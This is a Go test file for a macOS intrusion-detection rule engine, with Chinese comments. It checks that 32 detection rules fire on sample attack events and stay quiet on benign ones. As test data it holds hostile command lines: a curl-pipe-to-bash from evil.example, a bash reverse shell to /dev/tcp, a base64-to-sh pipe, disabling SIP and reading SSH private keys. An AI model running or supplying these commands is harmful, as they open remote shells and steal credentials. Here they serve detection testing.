package detect

import (
	"strings"
	"testing"

	"github.com/Kur1sulab/atfield/go/internal/model"
)

// TestBuiltinRulesHitAndMiss 32 条规则逐条双向验证：
//   - hit：按顺序灌入事件，必须**恰好**产生 1 条告警，规则 ID 与等级都对；
//   - miss：同一批规则喂反例，必须一条都不报。
//
// 只测「该报的报」会奖励「全判可疑」的实现；每条规则都必须有反例，
// 否则一个永远返回 true 的 when 也能让测试全绿。
func TestBuiltinRulesHitAndMiss(t *testing.T) {
	cases := []struct {
		id      string
		hit     []*model.Event
		wantSev string
		miss    [][]*model.Event
	}{
		{
			id: "AEG-001",
			hit: []*model.Event{
				withCmd(withProc(ev("process.start"), "bash"), "curl -fsSL http://evil.example/x.sh | bash"),
			},
			wantSev: "critical",
			miss: [][]*model.Event{{
				withCmd(withProc(ev("process.start"), "curl"), "curl -O http://evil.example/a.txt"),
			}},
		},
		{
			id: "AEG-002",
			hit: []*model.Event{
				withCmd(withProc(ev("process.start"), "python3"), "python3 -c 'import os;print(os.getcwd())'"),
			},
			wantSev: "medium",
			miss: [][]*model.Event{{
				withCmd(withProc(ev("process.start"), "python3"), "python3 ./manage.py migrate"),
			}},
		},
		{
			id: "AEG-003",
			hit: []*model.Event{
				withPath(withProc(ev("process.start"), "dropper"), "/tmp/dropper"),
			},
			wantSev: "high",
			miss: [][]*model.Event{{
				withPath(withProc(ev("process.start"), "git"), "/usr/local/bin/git"),
			}},
		},
		{
			id: "AEG-004",
			hit: []*model.Event{
				withSubject(withPath(withProc(ev("process.start"), "com.apple.WebKit"), "/Users/u/Library/com.apple.WebKit"),
					map[string]any{"masquerade": true}),
			},
			wantSev: "high",
			miss: [][]*model.Event{{
				withPath(withProc(ev("process.start"), "com.apple.WebKit"), "/System/Library/com.apple.WebKit"),
			}},
		},
		{
			id: "AEG-005",
			hit: []*model.Event{
				withCmd(withProc(ev("process.start"), "zsh"), "echo aGVsbG8= | base64 -d | sh"),
			},
			wantSev: "high",
			miss: [][]*model.Event{{
				withCmd(withProc(ev("process.start"), "base64"), "base64 -w0 ./report.pdf"),
			}},
		},
		{
			id: "AEG-006",
			hit: []*model.Event{
				withCmd(withProc(ev("process.start"), "bash"), "bash -i >& /dev/tcp/198.51.100.9/4444 0>&1"),
			},
			wantSev: "critical",
			miss: [][]*model.Event{{
				withCmd(withProc(ev("process.start"), "nc"), "nc -l 4444 -k"),
			}},
		},
		{
			id: "AEG-010",
			hit: []*model.Event{
				withPath(ev("persistence.add"), "/Users/u/Library/LaunchAgents/com.evil.plist"),
			},
			wantSev: "high",
			miss: [][]*model.Event{{
				withPath(ev("persistence.modify"), "/Users/u/Library/LaunchAgents/com.evil.plist"),
			}},
		},
		{
			id: "AEG-011",
			hit: []*model.Event{
				withPath(ev("persistence.modify"), "/Library/LaunchDaemons/com.evil.plist"),
			},
			wantSev: "high",
			miss: [][]*model.Event{{
				withPath(ev("persistence.add"), "/Library/LaunchDaemons/com.evil.plist"),
			}},
		},
		{
			id: "AEG-012",
			hit: []*model.Event{
				withSubject(ev("persistence.add"), map[string]any{
					"suspicious": []any{"/tmp/payload", "curl http://evil/x | sh"},
				}),
			},
			wantSev: "critical",
			miss: [][]*model.Event{{
				withSubject(ev("persistence.add"), map[string]any{"suspicious": []any{}}),
			}},
		},
		{
			id: "AEG-020",
			hit: []*model.Event{
				withCmd(withProc(ev("process.start"), "csrutil"), "csrutil disable"),
			},
			wantSev: "critical",
			miss: [][]*model.Event{{
				withCmd(withProc(ev("process.start"), "csrutil"), "csrutil status"),
			}},
		},
		{
			id: "AEG-021",
			hit: []*model.Event{
				withPath(withProc(ev("defense.cs_invalidated"), "evil"), "/Users/u/Library/evil"),
			},
			wantSev: "critical",
			miss: [][]*model.Event{{
				withPath(withProc(ev("process.start"), "evil"), "/Users/u/Library/evil"),
			}},
		},
		{
			id: "AEG-022",
			hit: []*model.Event{
				withCmd(ev("defense.gatekeeper_override"), "open /Applications/Evil.app"),
			},
			wantSev: "high",
			miss: [][]*model.Event{{
				ev("defense.removed"),
			}},
		},
		{
			id: "AEG-023",
			hit: []*model.Event{
				withPath(withProc(ev("defense.removed"), "falconctl"), "/Applications/Falcon.app"),
			},
			wantSev: "high",
			miss: [][]*model.Event{{
				ev("defense.event"),
			}},
		},
		{
			id: "AEG-030",
			hit: []*model.Event{
				withPath(withProc(ev("file.open"), "cat"), "/Users/x/.ssh/id_ed25519"),
			},
			wantSev: "high",
			miss: [][]*model.Event{{
				withPath(withProc(ev("file.open"), "cat"), "/Users/x/notes.txt"),
			}},
		},
		{
			id: "AEG-031",
			hit: []*model.Event{
				withSubject(withProc(ev("credential.access"), "securityd"),
					map[string]any{"note": "批量读取 login.keychain"}),
			},
			wantSev: "medium",
			miss: [][]*model.Event{{
				ev("file.open"),
			}},
		},
		{
			id: "AEG-040",
			hit: []*model.Event{withSubject(func() *model.Event {
				e := ev("net.listen")
				e.Severity = "high"
				return withProc(e, "redis-server")
			}(), map[string]any{"service": "redis", "addr": "0.0.0.0:6379"})},
			wantSev: "high", // 事件自带 high，与规则 medium 取 max
			miss: [][]*model.Event{
				{withSubject(ev("net.listen"), map[string]any{"service": "redis", "addr": "127.0.0.1:6379"})},
				{withSubject(func() *model.Event { e := ev("net.listen"); e.Severity = "medium"; return e }(),
					map[string]any{"service": "redis", "addr": "0.0.0.0:6379"})},
			},
		},
		{
			id: "AEG-041",
			hit: []*model.Event{
				withSubject(withProc(ev("net.connect"), "beacon"),
					map[string]any{"public": true, "rport": 8081, "raddr": "198.51.100.7"}),
			},
			wantSev: "medium",
			miss: [][]*model.Event{{
				withSubject(ev("net.connect"), map[string]any{"public": true, "rport": 443, "raddr": "1.1.1.1"}),
			}},
		},
		{
			id: "AEG-042",
			hit: []*model.Event{
				withSubject(withProc(ev("net.connect"), "beacon"),
					map[string]any{"rport": 4444, "raddr": "198.51.100.7"}),
			},
			wantSev: "critical",
			miss: [][]*model.Event{{
				withSubject(ev("net.connect"), map[string]any{"rport": 8081, "raddr": "198.51.100.7"}),
			}},
		},
		{
			id: "AEG-043",
			hit: []*model.Event{
				withSubject(func() *model.Event { e := ev("net.connect"); e.Severity = "critical"; return e }(),
					map[string]any{"rip": "203.0.113.9", "raddr": "evil.example"}),
			},
			// 闸门给 medium；事件自带 critical 不得抬高（severity_fn 优先）
			wantSev: "medium",
			miss: [][]*model.Event{{
				withSubject(ev("net.connect"), map[string]any{"rip": "198.51.100.7", "raddr": "good.example"}),
			}},
		},
		{
			id: "AEG-044",
			hit: []*model.Event{
				withPID(withSubject(withProc(ev("net.connect"), "backdoor"),
					map[string]any{"public": true, "raddr": "198.51.100.7"}), 400),
			},
			wantSev: "high",
			miss: [][]*model.Event{{
				withPID(withSubject(withProc(ev("net.connect"), "curl"),
					map[string]any{"public": true, "raddr": "198.51.100.7"}), 500),
			}},
		},
		{
			id:      "AEG-045",
			hit:     scanEvents(25),
			wantSev: "high",
			miss:    [][]*model.Event{scanEvents(24)},
		},
		{
			id:      "AEG-050",
			hit:     authFailEvents(6),
			wantSev: "high",
			miss:    [][]*model.Event{authFailEvents(5)},
		},
		{
			id: "AEG-051",
			hit: []*model.Event{
				withCmd(withProc(ev("auth.fail"), "sudo"), "sudo -u root id"),
			},
			wantSev: "medium",
			miss: [][]*model.Event{{
				ev("auth.success"),
			}},
		},
		{
			id: "AEG-052",
			hit: []*model.Event{
				withSubject(func() *model.Event {
					e := ev("auth.success")
					e.User = "u"
					return e
				}(), map[string]any{"from": "10.0.0.5"}),
			},
			wantSev: "medium",
			miss: [][]*model.Event{{
				// session.login 没有 remote → 不算远程登录成功
				ev("session.login"),
			}},
		},
		{
			id: "AEG-060",
			hit: []*model.Event{
				withPath(ev("integrity.change"), "/Users/u/.ssh/authorized_keys"),
			},
			wantSev: "critical",
			miss: [][]*model.Event{{
				withPath(ev("integrity.change"), "/Users/u/.zshrc"),
			}},
		},
		{
			id: "AEG-061",
			hit: []*model.Event{
				withPath(ev("integrity.change"), "/Users/u/.zshrc"),
			},
			wantSev: "medium",
			miss:    [][]*model.Event{{ev("process.start")}},
		},
		{
			id: "AEG-062",
			hit: []*model.Event{
				withSubject(ev("baseline.drift"), map[string]any{"name": "SIP", "from": "pass", "to": "fail"}),
			},
			wantSev: "high",
			miss:    [][]*model.Event{{ev("integrity.change")}},
		},
		{
			id:      "AEG-070",
			hit:     []*model.Event{withPID(withProc(ev("process.hidden"), "evil"), 999)},
			wantSev: "high",
			miss:    [][]*model.Event{{ev("process.start")}},
		},
		{
			id: "AEG-071",
			hit: []*model.Event{
				withCmd(ev("av.detect"), "/tmp/evil.bin: XProtect.Yara.OSX.Evil"),
			},
			wantSev: "high",
			miss:    [][]*model.Event{{ev("process.start")}},
		},
		{
			id:      "AEG-072",
			hit:     tccEvents(4),
			wantSev: "medium",
			miss:    [][]*model.Event{tccEvents(3)},
		},
		{
			id:      "AEG-073",
			hit:     discoveryEvents(6),
			wantSev: "medium",
			miss:    [][]*model.Event{discoveryEvents(5)},
		},
		{
			id: "AEG-074",
			hit: []*model.Event{
				withSubject(withPath(ev("file.write"), "/Users/u/.zsh_history"),
					map[string]any{"delta_bytes": 128}),
			},
			wantSev: "low",
			miss: [][]*model.Event{{
				withPath(ev("file.write"), "/Users/u/Documents/report.txt"),
			}},
		},
	}

	if len(cases) != len(BuiltinRules()) {
		t.Fatalf("用例数 %d != 规则数 %d：新增/删除规则必须同步补双向用例",
			len(cases), len(BuiltinRules()))
	}

	for _, tc := range cases {
		tc := tc
		t.Run(tc.id, func(t *testing.T) {
			r := ruleByID(t, tc.id)

			cfg := Config{}
			// AEG-043 的命中来自明文名单兜底（intel 未接入时的最低置信分档）
			if tc.id == "AEG-043" {
				cfg.IOCIPS = []string{"203.0.113.9"}
			}
			e, clk, _ := newEngineCfg(t, []Rule{r}, cfg)
			got := feed(e, clk, tc.hit)
			if len(got) != 1 {
				t.Fatalf("命中用例：期望 1 条告警，实得 %d 条（%v）", len(got), idsOf(got))
			}
			if got[0].RuleID != tc.id {
				t.Fatalf("命中用例：规则 ID = %s，期望 %s", got[0].RuleID, tc.id)
			}
			if got[0].Severity != tc.wantSev {
				t.Fatalf("命中用例：等级 = %s，期望 %s", got[0].Severity, tc.wantSev)
			}
			if got[0].Detail == "" {
				t.Fatalf("命中用例：detail 为空，前端无法解释「为什么可疑」")
			}
			if got[0].DedupKey == "" || got[0].Count != 1 {
				t.Fatalf("命中用例：准入字段未填（dedup_key=%q count=%d）", got[0].DedupKey, got[0].Count)
			}

			for i, miss := range tc.miss {
				e2, clk2, _ := newEngineCfg(t, []Rule{r}, cfg)
				if out := feed(e2, clk2, miss); len(out) != 0 {
					t.Fatalf("反例 %d：不应命中，实得 %v", i, idsOf(out))
				}
			}
		})
	}
}

// scanEvents n 条同 pid 公网连接（AEG-045：25 条/60 秒）。
func scanEvents(n int) []*model.Event {
	out := make([]*model.Event, 0, n)
	for i := 0; i < n; i++ {
		out = append(out, withPID(withSubject(withProc(ev("net.connect"), "scanner"),
			map[string]any{"public": true, "rport": 1000 + i, "raddr": "198.51.100.7"}), 400))
	}
	return out
}

// authFailEvents n 条同进程认证失败（AEG-050：6 条/300 秒）。
func authFailEvents(n int) []*model.Event {
	out := make([]*model.Event, 0, n)
	for i := 0; i < n; i++ {
		out = append(out, withCmd(withProc(ev("auth.fail"), "sudo"), "sudo -u root id"))
	}
	return out
}

// tccEvents n 条同进程 TCC 拒绝（AEG-072：4 条/120 秒）。
func tccEvents(n int) []*model.Event {
	out := make([]*model.Event, 0, n)
	for i := 0; i < n; i++ {
		out = append(out, withCmd(withProc(ev("tcc.deny"), "helper"), "访问通讯录被拒绝"))
	}
	return out
}

// discoveryEvents n 条同进程链侦察命令（AEG-073：6 条/120 秒）。
func discoveryEvents(n int) []*model.Event {
	cmds := []string{"whoami", "id", "hostname", "ifconfig -a", "netstat -an", "ps aux"}
	out := make([]*model.Event, 0, n)
	for i := 0; i < n; i++ {
		out = append(out, withPID(withCmd(withProc(ev("process.start"), "zsh"), cmds[i%len(cmds)]), 300))
	}
	return out
}

// TestBuiltinRuleIDsExact 规则清单必须逐字一致——掉一条就是一类漏报。
func TestBuiltinRuleIDsExact(t *testing.T) {
	want := []string{
		"AEG-001", "AEG-002", "AEG-003", "AEG-004", "AEG-005", "AEG-006",
		"AEG-010", "AEG-011", "AEG-012",
		"AEG-020", "AEG-021", "AEG-022", "AEG-023",
		"AEG-030", "AEG-031",
		"AEG-040", "AEG-041", "AEG-042", "AEG-043", "AEG-044", "AEG-045",
		"AEG-050", "AEG-051", "AEG-052",
		"AEG-060", "AEG-061", "AEG-062",
		"AEG-070", "AEG-071", "AEG-072", "AEG-073", "AEG-074",
	}
	rules := BuiltinRules()
	if len(rules) != len(want) {
		t.Fatalf("规则数 = %d，期望 %d", len(rules), len(want))
	}
	for i, id := range want {
		if rules[i].ID != id {
			t.Fatalf("第 %d 条 = %s，期望 %s（顺序也是对拍契约）", i, rules[i].ID, id)
		}
	}
}

// TestBuiltinRuleMetadataComplete 每条规则的元数据都不能空——缺 advice 的规则
// 在告警卡片上等于没有处置建议，是「移植了但当半个用」。
func TestBuiltinRuleMetadataComplete(t *testing.T) {
	for _, r := range BuiltinRules() {
		if r.Name == "" || r.Description == "" || r.Advice == "" {
			t.Errorf("%s 元数据缺失: name=%q desc=%q advice=%q", r.ID, r.Name, r.Description, r.Advice)
		}
		if !validSeverity(r.Severity) {
			t.Errorf("%s 等级非法: %q", r.ID, r.Severity)
		}
		if len(r.Tags) == 0 || len(r.MITRE) == 0 {
			t.Errorf("%s tags/mitre 不能为空", r.ID)
		}
		for _, m := range r.MITRE {
			if !strings.HasPrefix(m, "T") {
				t.Errorf("%s MITRE 编号格式异常: %q", r.ID, m)
			}
		}
		if r.When == nil {
			t.Errorf("%s 缺 when", r.ID)
		}
		if CooldownFor(&r) <= 0 {
			t.Errorf("%s 冷却非正数", r.ID)
		}
	}
}

// TestCollectorKindIsNotARuleAlias 钉住「规则只消费 Python 契约里的 kind」。
//
// 真实流对拍发现：Go 采集器把可疑进程发成 process.suspicious、把首轮持久化
// 发成 persistence.suspicious，而 Python 版规则里没有这两个 kind 的消费点，
// 于是同一批事件在 Go 侧一条告警都不出（明细见
// testdata/parity/REAL-STREAM-REPORT.md 第三节第 1 类差异）。
//
// 正确的修法在采集器：事件要按契约映射成 process.start + subject.suspicious_path /
// masquerade（持久化则是 persistence.add）。**不能**在规则里加 kind 别名——
// 那会让同一份事件在 Go 多报、Python 不报，对拍当场破裂。这条测试防的就是
// 那种「顺手在 when 里多认一个 kind」的改法。
func TestCollectorKindIsNotARuleAlias(t *testing.T) {
	cases := []struct {
		name    string
		rule    string
		kind    string
		path    string
		subject map[string]any
		want    int
	}{
		{
			name: "process.suspicious 不是 AEG-003 的输入",
			rule: "AEG-003", kind: "process.suspicious", path: "/tmp/dropper",
			subject: map[string]any{"suspicious_path": true}, want: 0,
		},
		{
			name: "process.start + suspicious_path 才是契约",
			rule: "AEG-003", kind: "process.start", path: "/tmp/dropper",
			subject: map[string]any{"suspicious_path": true}, want: 1,
		},
		{
			name: "persistence.suspicious 不是 AEG-010 的输入",
			rule: "AEG-010", kind: "persistence.suspicious",
			path: "/Users/u/Library/LaunchAgents/com.evil.plist", want: 0,
		},
		{
			name: "persistence.add 才是契约",
			rule: "AEG-010", kind: "persistence.add",
			path: "/Users/u/Library/LaunchAgents/com.evil.plist", want: 1,
		},
	}
	for _, tc := range cases {
		tc := tc
		t.Run(tc.name, func(t *testing.T) {
			e, clk, _ := newEngineCfg(t, []Rule{ruleByID(t, tc.rule)}, Config{})
			event := withPath(ev(tc.kind), tc.path)
			if tc.subject != nil {
				event = withSubject(event, tc.subject)
			}
			got := feed(e, clk, []*model.Event{event})
			if len(got) != tc.want {
				t.Fatalf("%s：期望 %d 条告警，实得 %d 条（%v）——kind 别名必须在采集器修，不在规则里",
					tc.rule, tc.want, len(got), idsOf(got))
			}
		})
	}
}
